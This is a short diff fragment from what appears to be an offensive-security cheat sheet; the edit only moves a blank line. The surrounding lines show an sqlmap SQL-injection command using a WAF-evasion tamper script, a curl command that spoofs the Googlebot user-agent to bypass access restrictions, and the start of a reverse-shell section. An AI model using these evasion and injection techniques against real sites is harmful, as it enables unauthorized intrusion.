@@ -89,8 +89,8 @@ sqlmap -u "http://example.com/vuln.php?id=1" --tamper=space2comment --level=5 --
 - Custom User-Agent to fool detection systems:
 ```
 curl -A "Googlebot/2.1 (+http://www.google.com/bot.html)" http://target.com
-
 ```
+
 > Impersonate a search engine crawler to bypass access restrictions.
 
 ### 🛡️ 4. Advanced Reverse Shells
